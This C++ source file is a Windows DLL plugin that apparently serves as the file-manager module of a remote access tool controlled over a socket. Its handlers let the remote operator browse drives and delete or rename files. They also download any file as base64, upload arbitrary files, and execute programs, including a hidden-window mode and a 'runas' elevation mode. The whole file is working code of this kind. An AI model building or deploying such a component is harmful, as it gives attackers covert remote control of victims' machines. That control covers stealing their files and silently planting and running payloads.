#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <cstdint>
#include <algorithm>
#include <fstream>
#include "../../include/json.hpp"
#include "../../include/base64.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace std;

static void send_json(SOCKET sock, const json& data) {
    string msg = data.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1) return "";
    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static wstring utf8_to_wide(const string& value) {
    if (value.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, NULL, 0);
    if (size <= 1) return L"";
    wstring result(size - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, &result[0], size);
    return result;
}

static string get_last_error_message(DWORD errorCode) {
    if (errorCode == ERROR_SUCCESS) return "Success";
    char* buffer = nullptr;
    DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&buffer, 0, NULL
    );
    string message = (size && buffer) ? string(buffer, size) : ("Error code: " + to_string(errorCode));
    if (buffer) LocalFree(buffer);
    while (!message.empty() && (message.back() == '\r' || message.back() == '\n' || message.back() == ' '))
        message.pop_back();
    return message;
}

static string get_file_type(DWORD attributes, const wstring& extension) {
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) return "Directory";
    return "File";
}

static json list_directory(wstring path) {
    json items = json::array();

    if (path.empty()) {
        // List logical drives
        DWORD drives = GetLogicalDrives();
        for (int i = 0; i < 26; i++) {
            if (drives & (1 << i)) {
                wchar_t drive[] = { (wchar_t)('A' + i), ':', '\\', 0 };
                json item;
                item["name"] = wide_to_utf8(drive);
                item["date"] = "";
                item["type"] = "Drive";
                item["size"] = "";
                items.push_back(item);
            }
        }
        return items;
    }

    if (path.back() != L'\\') path += L'\\';
    wstring searchPath = path + L"*";

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
                continue;

            json item;
            item["name"] = wide_to_utf8(fd.cFileName);

            SYSTEMTIME st;
            FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
            char dateBuf[64];
            snprintf(dateBuf, sizeof(dateBuf), "%04d-%02d-%02d %02d:%02d:%02d",
                     st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            item["date"] = string(dateBuf);

            item["type"] = get_file_type(fd.dwFileAttributes, L"");

            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                item["size"] = "";
            } else {
                unsigned long long size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
                if (size < 1024) item["size"] = to_string(size) + " B";
                else if (size < 1024 * 1024) item["size"] = to_string(size / 1024) + " KB";
                else item["size"] = to_string(size / (1024 * 1024)) + " MB";
            }

            items.push_back(item);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    return items;
}

static void send_list_response(SOCKET sock, const wstring& path) {
    json response;
    response["action"] = "filemanager_response";
    response["path"] = wide_to_utf8(path);
    response["items"] = list_directory(path);
    send_json(sock, response);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_list_response(sock, L"");
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");
        wstring path = utf8_to_wide(command.value("path", ""));

        if (action == "filemanager_list") {
            send_list_response(sock, path);
            return;
        }

        json response;
        response["action"] = "filemanager_response";

        if (action == "filemanager_delete") {
            wstring name = utf8_to_wide(command.value("name", ""));
            wstring fullPath = path;
            if (!fullPath.empty() && fullPath.back() != L'\\') fullPath += L'\\';
            fullPath += name;

            DWORD attr = GetFileAttributesW(fullPath.c_str());
            BOOL success = (attr & FILE_ATTRIBUTE_DIRECTORY) ? RemoveDirectoryW(fullPath.c_str()) : DeleteFileW(fullPath.c_str());

            response["status"] = success ? "success" : "error";
            response["message"] = success ? "Item deleted" : get_last_error_message(GetLastError());
        }
        else if (action == "filemanager_rename") {
            wstring oldName = utf8_to_wide(command.value("oldname", ""));
            wstring newName = utf8_to_wide(command.value("newname", ""));
            wstring basePath = path;
            if (!basePath.empty() && basePath.back() != L'\\') basePath += L'\\';

            wstring oldPath = basePath + oldName;
            wstring newPath = basePath + newName;

            BOOL success = MoveFileW(oldPath.c_str(), newPath.c_str());
            response["status"] = success ? "success" : "error";
            response["message"] = success ? "Item renamed" : get_last_error_message(GetLastError());
        }
        else if (action == "filemanager_newfolder") {
            wstring name = utf8_to_wide(command.value("name", ""));
            wstring fullPath = path;
            if (!fullPath.empty() && fullPath.back() != L'\\') fullPath += L'\\';
            fullPath += name;

            BOOL success = CreateDirectoryW(fullPath.c_str(), NULL);
            response["status"] = success ? "success" : "error";
            response["message"] = success ? "Folder created" : get_last_error_message(GetLastError());
        }
        if (action == "filemanager_download") {
            wstring name = utf8_to_wide(command.value("name", ""));
            wstring fullPath = path;
            if (!fullPath.empty() && fullPath.back() != L'\\') fullPath += L'\\';
            fullPath += name;

            ifstream file(fullPath, ios::binary);
            if (file) {
                vector<unsigned char> buffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
                response["status"] = "success";
                response["name"] = wide_to_utf8(name);
                response["data"] = base64_encode(buffer.data(), buffer.size());
            } else {
                response["status"] = "error";
                response["message"] = "Could not open file for reading";
            }
        }
        else if (action == "filemanager_upload") {
            wstring name = utf8_to_wide(command.value("name", ""));
            string data64 = command.value("data", "");
            wstring fullPath = path;
            if (!fullPath.empty() && fullPath.back() != L'\\') fullPath += L'\\';
            fullPath += name;

            vector<unsigned char> decoded = base64_decode(data64);
            ofstream file(fullPath, ios::binary);
            if (file) {
                file.write((char*)decoded.data(), decoded.size());
                response["status"] = "success";
                response["message"] = "File uploaded successfully";
                file.close();
            } else {
                response["status"] = "error";
                response["message"] = "Could not open file for writing";
            }
        }
        else if (action == "filemanager_paste") {
            wstring src = utf8_to_wide(command.value("src", ""));
            wstring dest_path = utf8_to_wide(command.value("dest_path", ""));
            string mode = command.value("mode", "copy");

            size_t lastSlash = src.find_last_of(L"\\");
            wstring fileName = (lastSlash == wstring::npos) ? src : src.substr(lastSlash + 1);

            if (!dest_path.empty() && dest_path.back() != L'\\') dest_path += L'\\';
            wstring destFull = dest_path + fileName;

            BOOL success = FALSE;
            if (mode == "copy") {
                success = CopyFileW(src.c_str(), destFull.c_str(), FALSE);
            } else {
                success = MoveFileW(src.c_str(), destFull.c_str());
            }

            response["status"] = success ? "success" : "error";
            response["message"] = success ? "Paste successful" : get_last_error_message(GetLastError());
        }
        else if (action == "filemanager_execute") {
            wstring name = utf8_to_wide(command.value("name", ""));
            string mode = command.value("mode", "normal");
            wstring fullPath = path;
            if (!fullPath.empty() && fullPath.back() != L'\\') fullPath += L'\\';
            fullPath += name;

            int nShow = SW_SHOWNORMAL;
            const wchar_t* verb = L"open";
            if (mode == "hidden") nShow = SW_HIDE;
            if (mode == "runas") verb = L"runas";

            HINSTANCE hInst = ShellExecuteW(NULL, verb, fullPath.c_str(), NULL, path.c_str(), nShow);
            BOOL success = (INT_PTR)hInst > 32;

            response["status"] = success ? "success" : "error";
            response["message"] = success ? "Execution started" : get_last_error_message(GetLastError());
        }

        if (!response["status"].is_null()) {
            send_json(sock, response);
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
